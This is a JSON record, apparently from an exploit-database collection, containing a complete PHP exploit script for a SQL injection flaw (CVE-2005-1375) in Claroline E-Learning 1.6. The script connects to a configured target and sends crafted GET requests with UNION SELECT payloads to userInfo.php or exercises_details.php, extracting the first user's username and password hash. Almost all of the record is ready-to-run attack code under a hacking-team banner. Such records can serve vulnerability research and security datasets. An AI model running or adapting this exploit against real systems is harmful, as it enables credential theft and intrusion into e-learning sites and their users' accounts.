{
  "id": "1052",
  "title": "Claroline E-Learning 1.6 - Remote Hash SQL Injection (1)",
  "cve": "CVE-2005-1375",
  "vuln_type": "sqli",
  "code": "<?php\r\n#############################################################################\r\n#    T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m\r\n#############################################################################\r\n# Vulnerable:   Claroline E-Learning Application\r\n#\r\n# Exploit By :  MH_p0rtal\r\n#\r\n# Discovered By: Sieg Fried\r\n#\r\n#############################################################################\r\n#  Gr33tz To ==>   Alpha_programmer , Oil_karchack , Dr_CephaleX , Str0ke\r\n#\r\n#  And Iranian Hacking & Security Teams :\r\n#  IHS TeaM , alphaST , Shabgard Security Team  , Emperor Hacking Team  ,\r\n#  Crouz Security Team  & Simorgh-ev Security Team\r\n#############################################################################\r\n# ___________Config :\r\n# please replace your address :\r\n$url = \"http:///www.example.com\";\r\n# Please replace your name file  ( userInfo.php Or  exercises_details.php )\r\n$file1 = \"userInfo.php\";\r\n# please replace your dir address :\r\n$dirs = \"/dir/to/claroline/user/\";\r\n# __________End Config\r\n#############################################################################\r\nif ( $file1 == \"userInfo.php\" ) {\r\n$merg = $dirs.$file1;\r\n$fc = fsockopen(\"$url\", 80, $errno, $errstr, 30);\r\nif (!$fc) {\r\n\r\necho \"Can't Connect\\n\";\r\n} else {\r\n   $mh = \"GET $merg?uInfo=-1%20UNION%20SELECT%20username,password,0,0,0,0,0%20from%20user%20where%20user_id=1/*  HTTP/1.1\\r\\n\";\r\n   $mh .= \"Host: $url\\r\\n\";\r\n   $mh .= \"Connection: Close\\r\\n\\r\\n\";\r\n\r\n  fwrite($fc, $mh);\r\n  while (!feof($fc)) {\r\n  echo fgets($fc, 1024);\r\n  }\r\n   fclose($fc);\r\n}\r\n}\r\n//-------------------------------------------------------------------------------------------\r\nif ( $file1 == \"exercises_details.php\" ) {\r\n$merg = $dirs.$file1;\r\n$fc = fsockopen(\"$url\", 80, $errno, $errstr, 30);\r\nif (!$fc) {\r\n\r\necho \"Can't Connect\\n\";\r\n} else {\r\n   $mh = \"GET $merg?exo_id=-1/**/UNION/**/SELECT%200,password,username,0,0,0%20from%20user%20where%20user_id=1--  HTTP/1.1\\r\\n\";\r\n   $mh .= \"Host: $url\\r\\n\";\r\n   $mh .= \"Connection: Close\\r\\n\\r\\n\";\r\n\r\n  fwrite($fc, $mh);\r\n  while (!feof($fc)) {\r\n  echo fgets($fc, 1024);\r\n  }\r\n   fclose($fc);\r\n}\r\n}\r\n?>\r\n\r\n// milw0rm.com [2005-06-17]",
  "url": "https://www.exploit-db.com/exploits/1052"
}